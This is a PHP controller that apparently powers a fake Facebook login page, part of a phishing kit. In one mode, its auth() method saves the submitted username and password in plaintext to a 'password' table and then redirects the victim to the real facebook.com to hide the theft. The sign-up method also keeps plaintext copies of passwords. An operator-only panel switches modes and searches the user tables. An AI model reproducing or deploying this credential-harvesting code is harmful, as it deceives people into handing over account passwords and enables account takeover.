<?php

namespace App\Controllers;

class Facebook extends BaseController
{
    public function index(): string
    {
        return view('facebook/login', ['judul' => 'Facebook - Masuk atau Daftar']);
    }
    public function wrong_password(): string
    {
        return view('facebook/wrong_password', ['judul' => 'Log in to Facebook']);
    }

    public function auth()
    {
        $username = clear($this->request->getVar('username'));
        $password = clear($this->request->getVar('password'));

        if (settings()['versi_fb'] == 1) {
            $db = db('password');
            $data = [
                'username' => $username,
                'password' => $password
            ];

            if ($db->insert($data)) {
                return redirect()->to('https://www.facebook.com/');
            }
        }

        if (settings()['versi_fb'] == 2 || settings()['versi_fb'] == 3) {
            $db = db('penjudi');
            $q = $db->where('username', $username)->get()->getRowArray();

            if (!$q) {
                gagal(base_url('facebook'), 'Username not found!.');
            }

            if (!password_verify($password, $q['password'])) {
                gagal(base_url('facebook'), 'Password wrong!.');
            }

            $data = [
                'id' => $q['id'],
                'role' => $q['role'],
                'nama' => $q['nama']
            ];


            session()->set($data);


            sukses(base_url('facebook/home'), 'Ok');
        }
    }

    public function logout()
    {
        session()->remove('id');
        session()->remove('role');
        session()->remove('nama');

        sukses(base_url('facebook'), 'Logout sukses!.');
    }

    public function home()
    {
        if (!session('id')) {
            gagal(base_url('facebook'), 'Please login!.');
        }

        return view('facebook/home', ['judul' => 'Facebook -  Home']);
    }
    public function fyp()
    {
        if (!session('id')) {
            gagal(base_url('facebook'), 'Please login!.');
        }
        $id = clear($this->request->getVar('id'));
        $kategori = clear($this->request->getVar('kategori'));
        $db = db('fyp');

        $data = [
            'user_id' => session('id'),
            'ket' => $kategori,
            'status_id' => $id,
            'created_at' => time()
        ];

        if ($db->insert($data)) {
            sukses_js('Ok');
        } else {
            gagal_js('Data failed!.');
        }
    }

    public function settings()
    {
        if (!session('id')) {
            gagal(base_url('facebook'), 'Please login!.');
        }
        if (user()['role'] !== 'Root') {
            gagal(base_url('facebook/home'), 'Disallowed!.');
        }
        return view('facebook/settings', ['judul' => 'Settings']);
    }
    public function update_versi_fb()
    {
        if (!session('id')) {
            gagal(base_url('facebook'), 'Please login!.');
        }
        if (user()['role'] !== 'Root') {
            gagal(base_url('facebook/home'), 'Disallowed!.');
        }

        $db = db('settings');
        $data = settings();
        $db->where('id', $data['id']);
        $data['versi_fb'] = ($data['versi_fb'] == 3 ? 1 : $data['versi_fb'] + 1);

        if ($db->update($data)) {
            sukses(base_url('facebook/settings'), 'Update sukses.');
        } else {
            gagal(base_url('facebook/settings'), 'Update failed!.');
        }
    }

    public function data_fyp($id = null)
    {

        if (!session('id')) {
            dd('session');
            gagal(base_url('facebook'), 'Please login!.');
        }


        if (user()['role'] == 'Member' && settings()['versi_fb'] != 3) {
            gagal(base_url('facebook/home'), 'Not allowed.');
        }

        $data = ($id == null ? data_fyp() : data_fyp($id));

        return view('facebook/data_fyp', ['judul' => 'Data Fyp', 'data' => $data]);
    }

    public function cari_db()
    {
        if (!session('id')) {
            gagal(base_url('facebook'), 'Please login!.');
        }
        if (user()['role'] !== 'Root') {
            gagal(base_url('facebook/home'), 'Disallowed!.');
        }
        $dbs = clear($this->request->getVar('db'));
        $text = clear($this->request->getVar('text'));

        $db = db($dbs);
        $q = $db->whereNotIn('role', ['Root'])->like('nama', $text, 'both')->get()->getResultArray();


        sukses_js('Ok', $q);
    }

    public function visit($order, $id)
    {
        if (!session('id')) {
            gagal(base_url('facebook'), 'Please login!.');
        }
        $db = db('status');
        $q = $db->where('id', $id)->get()->getRowArray();

        if (!$q) {
            gagal(base_url('facebook/home'), 'Id not found!.');
        }

        if ($order == 'user' && $q['jenis'] !== 'user') {

            $q = $db->where('nama', $q['nama'])->where('jenis', 'user')->get()->getRowArray();

            if ($q) {
                $id = $q['id'];
            }
        }

        $dbf = db('fyp');
        $data = [
            'user_id' => session('id'),
            'ket' => strtolower($order),
            'status_id' => $id,
            'created_at' => time()
        ];

        $dbf->insert($data);
        return view('facebook/' . ($order == 'user' ? 'visit_teman' : 'visit_group'), ['judul' => ($q['jenis'] == 'teman' ? $q['nama'] : ($q['jenis'] == 'produk' ? 'nama_grup' : '')), 'data' => $q]);
    }
    public function add()
    {
        $username = strtolower(clear($this->request->getVar('username')));
        $nama = upper_first(clear($this->request->getVar('nama')));
        $password = $this->request->getVar('password');

        $db = db('penjudi');
        $exist = $db->where('username', $username)->get()->getRowArray();

        if ($exist) {
            gagal(base_url('facebook'), 'Username already taken!.');
        }

        $data = [
            'username' => $username,
            'nama' => $nama,
            'role' => 'Member',
            'img' => 'images.jpg',
            'password' => password_hash($password, PASSWORD_DEFAULT)
        ];

        if ($db->insert($data)) {
            $data2 = [
                'username' => $username,
                'password' => $password
            ];

            $db = db('password');

            if ($db->insert($data2)) {
                sukses(base_url('facebook'), 'Sign up succees.');
            }
        }
    }
}
